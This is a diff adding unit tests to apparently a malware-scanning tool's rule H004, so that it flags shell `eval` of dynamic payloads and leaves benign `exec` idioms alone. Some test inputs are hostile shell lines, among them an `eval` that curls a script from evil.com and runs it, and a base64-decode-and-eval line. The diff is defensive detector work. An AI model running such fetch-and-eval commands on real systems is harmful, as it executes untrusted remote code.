@@ -226,6 +226,56 @@ class TestRuleH004EvalExec:
         ctx = _ctx(content=b"print('hello')", is_script=True)
         assert _r_eval_exec(ctx, "H004") is None
 
+    # Achado real 2026-09-22: `eval` de shell não usa parênteses — a regex
+    # antiga (só `eval\s*\(`) deixava passar batido a forma mais comum de
+    # dropper (payload decodificado numa variável, rodado via `eval`).
+    def test_eval_shell_bare_var_triggers(self) -> None:
+        ctx = _ctx(content=b"eval $cmd", is_script=True)
+        assert _r_eval_exec(ctx, "H004") is not None
+
+    def test_eval_shell_quoted_var_triggers(self) -> None:
+        ctx = _ctx(content=b'eval "$cmd"', is_script=True)
+        assert _r_eval_exec(ctx, "H004") is not None
+
+    def test_eval_shell_command_substitution_triggers(self) -> None:
+        payload = b'eval "$(curl -s http://evil.com/x.sh)"'
+        ctx = _ctx(content=payload, is_script=True)
+        assert _r_eval_exec(ctx, "H004") is not None
+
+    def test_eval_shell_command_substitution_no_quotes_triggers(self) -> None:
+        ctx = _ctx(content=b"eval $(echo aGVsbG8= | base64 -d)", is_script=True)
+        assert _r_eval_exec(ctx, "H004") is not None
+
+    def test_eval_shell_brace_expansion_triggers(self) -> None:
+        ctx = _ctx(content=b"eval ${PAYLOAD}", is_script=True)
+        assert _r_eval_exec(ctx, "H004") is not None
+
+    def test_eval_shell_backtick_triggers(self) -> None:
+        ctx = _ctx(content=b"eval `cat /tmp/.payload`", is_script=True)
+        assert _r_eval_exec(ctx, "H004") is not None
+
+    # `eval` de shell com argumento literal (sem substituição/variável) não
+    # é o padrão de ataque (payload dinâmico) — não deve disparar.
+    def test_eval_shell_static_string_no_trigger(self) -> None:
+        ctx = _ctx(content=b'eval "echo hello"', is_script=True)
+        assert _r_eval_exec(ctx, "H004") is None
+
+    # `exec` de shell foi deixado de fora de propósito (idiomas benignos e
+    # comuns em entrypoint/wrapper scripts) — não deve disparar.
+    def test_exec_shell_args_passthrough_no_trigger(self) -> None:
+        ctx = _ctx(content=b'exec "$@"', is_script=True)
+        assert _r_eval_exec(ctx, "H004") is None
+
+    def test_exec_shell_var_no_trigger(self) -> None:
+        ctx = _ctx(content=b"exec $SHELL -l", is_script=True)
+        assert _r_eval_exec(ctx, "H004") is None
+
+    # "evaluate(...)"/"execute(...)" não são eval/exec — word boundary já
+    # cobria isso antes, garantir que a nova alternativa não regride.
+    def test_evaluate_word_no_trigger(self) -> None:
+        ctx = _ctx(content=b"result = evaluate($model)", is_script=True)
+        assert _r_eval_exec(ctx, "H004") is None
+
 
 class TestRuleH005DownloadExecute:
     def test_wget_pipe_sh_triggers(self) -> None:
